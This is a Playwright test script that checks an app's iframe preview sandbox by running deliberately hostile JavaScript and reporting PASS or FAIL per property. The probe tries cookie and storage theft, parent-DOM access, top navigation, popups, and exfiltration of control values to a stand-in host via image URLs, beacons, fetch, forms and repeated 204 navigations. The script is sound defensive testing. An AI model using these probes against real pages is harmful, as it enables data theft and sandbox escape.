// Checks what the preview sandbox enforces, in a real browser, with hostile preview code. Needs the running app
// (development server, no owner key) and makes no Context.dev request. Prints PASS or FAIL per property; exits 1 on a FAIL.
// Usage: node scripts/sandbox-check.ts http://127.0.0.1:<port>
import { chromium } from "playwright-core";

const base = process.argv[2];
const tag = Date.now().toString(36);
const EVIL = "https://example.com";

const spec = (id: string, js: string) => ({
  id,
  title: `Sandbox check ${id}`,
  controls: [{ id: "size", type: "slider", label: "Size", meaning: "font size of the report in px", min: 8, max: 20, initial: 12 }],
  view: { type: "preview", height: 420, html: '<pre id="report" style="font-size: {{size}}px; white-space: pre-wrap">running</pre>', js },
  outputs: [{ id: "size", label: "Font size", template: "{{size}}px" }],
});

/** Hostile code: it tries to reach the page around it, its storage and the network, and writes what happened into its own document. */
const PROBE = `
const out = {};
const attempt = (name, fn) => { try { out[name] = "ALLOWED " + String(fn()).slice(0, 80); } catch (e) { out[name] = "blocked " + (e && e.name); } };
attempt("own_cookie", () => document.cookie);
// Opened directly, the frame document is the top page: it has no page around it, and a page may always navigate itself.
if (top !== self) {
  attempt("parent_cookie", () => parent.document.cookie);
  attempt("parent_dom", () => parent.document.body.innerHTML.length);
  attempt("top_dom", () => top.document.title);
  attempt("top_navigation", () => { top.location = "${EVIL}/top"; return "set"; });
}
attempt("local_storage", () => localStorage.getItem("x"));
attempt("session_storage", () => sessionStorage.length);
attempt("indexed_db", () => indexedDB.open("x"));
attempt("opaque_origin", () => { if (self.origin === "null") throw { name: "origin is null" }; return self.origin; });
attempt("popup", () => { const w = window.open("${EVIL}/popup"); if (!w) throw { name: "no window" }; return "opened"; });
// These two do not throw when they are refused. The check watches the browser instead: no dialog, no request.
try { alert("from the preview"); } catch (e) {}
try { navigator.sendBeacon("${EVIL}/beacon", "x"); } catch (e) {}
const later = [];
const net = (name, p) => later.push(p.then((r) => { out[name] = "ALLOWED " + r; }, (e) => { out[name] = "blocked " + (e && e.name || e); }));
net("fetch_external", fetch("${EVIL}/fetch").then((r) => r.status));
net("fetch_app", fetch("/api/playgrounds").then((r) => r.status));
net("xhr", new Promise((ok, no) => { const x = new XMLHttpRequest(); x.onload = () => ok(x.status); x.onerror = () => no("error"); try { x.open("GET", "${EVIL}/xhr"); x.send(); } catch (e) { no(e.name); } }));
net("worker", new Promise((ok, no) => { try { const w = new Worker("data:text/javascript,postMessage(1)"); w.onmessage = () => ok("ran"); w.onerror = () => no("error"); } catch (e) { no(e.name); } }));
net("websocket", new Promise((ok, no) => { try { const w = new WebSocket("wss://example.com/ws"); w.onopen = () => ok("open"); w.onerror = () => no("error"); } catch (e) { no(e.name); } }));
net("image", new Promise((ok, no) => { const i = new Image(); i.onload = () => ok("loaded"); i.onerror = () => no("error"); i.src = "${EVIL}/pixel.png?c=" + encodeURIComponent(JSON.stringify(clay.values)); }));
net("script", new Promise((ok, no) => { const s = document.createElement("script"); s.onload = () => ok("loaded"); s.onerror = () => no("error"); s.src = "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"; document.head.appendChild(s); }));
net("form", new Promise((ok, no) => { const f = document.createElement("form"); f.action = "${EVIL}/form"; f.method = "post"; document.body.appendChild(f); document.addEventListener("securitypolicyviolation", (e) => { if (e.effectiveDirective === "form-action") no("form-action"); }); try { f.submit(); } catch (e) { no(e.name); } setTimeout(() => no("no navigation"), 1200); }));
// A forged bridge message: the page must ignore every type it does not know.
parent.postMessage({ clay: 1, type: "settle", values: { size: 20 } }, "*");
Promise.all(later).then(() => { document.getElementById("report").textContent = JSON.stringify(out, null, 1); });
`;
const FLOOD = `setInterval(() => { for (let i = 0; i < 20; i++) parent.postMessage({ clay: 1, type: "ready", junk: "x".repeat(10000) }, "*"); }, 100);`;
const NAVIGATE = `setTimeout(() => { location.href = "/"; }, 600);`;
// The reviewer's case: a URL that answers 204 No Content keeps the document, so no second load event fires, and each
// navigation sends the control values to another host.
const NAVIGATE_204 = `setInterval(() => { location.href = "${EVIL}/nav204?size=" + clay.values.size + "&n=" + Date.now(); }, 300);`;

const create = async (id: string, js: string) => {
  const r = await fetch(`${base}/api/playgrounds`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(spec(id, js)) });
  if (r.status !== 201) throw new Error(`could not create ${id}: ${r.status} ${await r.text()}`);
};
await create(`sbx-probe-${tag}`, PROBE);
await create(`sbx-flood-${tag}`, FLOOD);
await create(`sbx-nav-${tag}`, NAVIGATE);
await create(`sbx-nav204-${tag}`, NAVIGATE_204);

const browser = await chromium.launch({ executablePath: process.env.CHROME ?? "/snap/bin/chromium" });
const context = await browser.newContext();
// A readable (not httpOnly) cookie and a localStorage item on the app's origin: what the preview must not be able to read.
await context.addCookies([{ name: "clay_probe", value: "secret-cookie", url: base }]);
// A request that the policy blocks never reaches the network layer, so this handler must never run.
const external: string[] = [];
const dialogs: string[] = [];
let popups = 0;
await context.route(/example\.com|lodash/, (route) => {
  external.push(`${route.request().resourceType()} ${route.request().url().slice(0, 60)}`);
  return route.abort();
});
// Registered later, so it takes precedence for these URLs: it answers 204 like the reviewer's endpoint, and counts.
const nav204: string[] = [];
await context.route(/example\.com\/nav204/, (route) => {
  nav204.push(route.request().url());
  return route.fulfill({ status: 204 });
});

let failed = 0;
const check = (name: string, pass: boolean, detail = "") => {
  if (!pass) failed++;
  console.log(`${pass ? "PASS" : "FAIL"}  ${name}${detail ? `  (${detail})` : ""}`);
};

async function probe(where: string, url: string, framed: boolean) {
  const page = await context.newPage();
  page.on("dialog", (d) => void (dialogs.push(d.message()), d.dismiss()));
  page.on("popup", () => popups++);
  await page.goto(url, { waitUntil: "load" });
  if (framed) await page.evaluate(() => localStorage.setItem("x", "secret-storage"));
  if (framed) await page.waitForEvent("frameattached", { timeout: 5000 }).catch(() => {});
  const doc = framed ? (await page.waitForSelector("iframe")).contentFrame().then((f) => f!) : page.mainFrame();
  await (await doc).waitForFunction(() => document.getElementById("report")?.textContent?.startsWith("{"), null, { timeout: 15000 });
  const out = JSON.parse((await (await doc).locator("#report").textContent())!) as Record<string, string>;
  for (const [k, v] of Object.entries(out)) check(`${where}: ${k}`, v.startsWith("blocked"), v);
  check(`${where}: the top page did not navigate`, page.url() === url, page.url());
  if (framed) {
    check(`${where}: the page shows the preview as failed (a sandbox violation was reported)`, /Preview failed: Blocked by the sandbox/.test(await page.locator('p[role="alert"]').innerText().catch(() => "")));
    check(`${where}: a forged "settle" message settled nothing`, (await page.locator("[data-settled]").count()) === 0);
  }
  await page.close();
}
await probe("in the page", `${base}/p/sbx-probe-${tag}`, true);
// Opened as a top-level page, the embedding page's frame-src does not apply, so the app serves no document at all.
{
  const page = await context.newPage();
  const response = await page.goto(`${base}/p/sbx-probe-${tag}/frame`, { waitUntil: "load" });
  await page.waitForTimeout(1500);
  check("frame URL opened directly: no preview document is served", response?.status() === 403 && (await page.locator("#report").count()) === 0, `status ${response?.status()}`);
  await page.close();
}
// Framed by another site: refused the same way (the browser marks the request cross-site).
const foreign = await fetch(`${base}/p/sbx-probe-${tag}/frame`, { headers: { "Sec-Fetch-Dest": "iframe", "Sec-Fetch-Site": "cross-site" } });
check("frame URL framed by another site: refused", foreign.status === 403, `status ${foreign.status}`);
check("no request for an external host reached the network", external.length === 0, external.join(", "));
check("no dialog was shown", dialogs.length === 0, dialogs.join(", "));
check("no popup or new tab was opened", popups === 0);

// As the browser's iframe request (Fetch Metadata): the policy header. Without the headers: refused (fails closed).
const res = await fetch(`${base}/p/sbx-probe-${tag}/frame`, { headers: { "Sec-Fetch-Dest": "iframe", "Sec-Fetch-Site": "same-origin" } });
const bare = await fetch(`${base}/p/sbx-probe-${tag}/frame`);
check("frame URL without Fetch Metadata headers: refused, with a notice and no script", bare.status === 403 && /Preview unavailable/.test(await bare.text()) && /^sandbox; default-src 'none'/.test(bare.headers.get("content-security-policy") ?? ""), `status ${bare.status}`);
const csp = res.headers.get("content-security-policy") ?? "";
check("the frame response carries the sandbox policy as a header", /^sandbox allow-scripts; default-src 'none'/.test(csp) && csp.includes("connect-src 'none'") && csp.includes("frame-ancestors 'self'"), csp.slice(0, 60));

for (const [id, what, text] of [[`sbx-flood-${tag}`, "a message flood stops the preview and removes the frame", /too many messages/], [`sbx-nav-${tag}`, "a preview that navigates its own frame is removed", /navigated away/]] as const) {
  const page = await context.newPage();
  await page.goto(`${base}/p/${id}`, { waitUntil: "load" });
  await page.waitForTimeout(2500);
  const alert = await page.locator('p[role="alert"]').innerText().catch(() => "");
  check(what, text.test(alert) && (await page.locator("iframe").count()) === 0, alert.slice(0, 80));
  await page.close();
}
// A client-side navigation keeps the policy of the page the visitor landed on, so every page must limit frames.
for (const path of ["/", "/connect", "/sign-in", `/p/sbx-probe-${tag}`]) {
  const policy = (await fetch(`${base}${path}`)).headers.get("content-security-policy") ?? "";
  check(`${path} limits frames (frame-src 'self' and Clerk's hosts only)`, /^frame-src 'self'( https:\/\/[a-z0-9.-]+)*$/.test(policy), policy.slice(0, 90));
}
// The preview keeps navigating its frame to a URL that answers 204. The page's frame-src must stop every such request.
{
  const page = await context.newPage();
  await page.goto(`${base}/p/sbx-nav204-${tag}`, { waitUntil: "load" });
  await page.waitForTimeout(3500);
  check("a preview that navigates its frame to another host (204 answer) sends no request", nav204.length === 0, `${nav204.length} requests, first ${nav204[0]?.slice(0, 70) ?? "-"}`);
  await page.close();
}
await browser.close();
console.log(failed ? `${failed} FAILED` : "all sandbox checks passed");
process.exit(failed ? 1 : 0);
